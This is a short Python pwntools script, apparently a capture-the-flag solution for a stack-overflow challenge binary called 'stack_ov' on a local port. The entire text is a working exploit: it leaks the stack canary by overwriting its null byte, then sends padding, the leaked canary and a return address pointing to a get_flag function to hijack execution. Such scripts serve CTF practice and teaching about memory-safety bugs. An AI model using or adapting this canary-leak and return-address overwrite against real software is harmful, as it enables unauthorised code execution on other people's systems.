#coding:utf-8
from pwn import *

context.log_level = 'debug'
get_flag_addr = 0x0400786

LOCAL = False

if LOCAL:
    p = process('./stack_ov')
else:
    p = remote('127.0.0.1', 22333)

padding = 'A'*0x48

raw_input('start?')
p.recvuntil('scientist?\n')
p.send(padding + 'F')
p.recvuntil(padding + 'F')
lk_data = p.recv(7)
lk_data = (chr(0) + lk_data).ljust(8, '\x00')
lk_canary = u64(lk_data)
print 'canary:', hex(lk_canary)
raw_input('pwn?')

payload = padding + p64(lk_canary) + 'B'*0x08 + p64(get_flag_addr)
p.send(payload)
raw_input('over?')
p.recvuntil('professional?')

print p.recvall()

p.close()


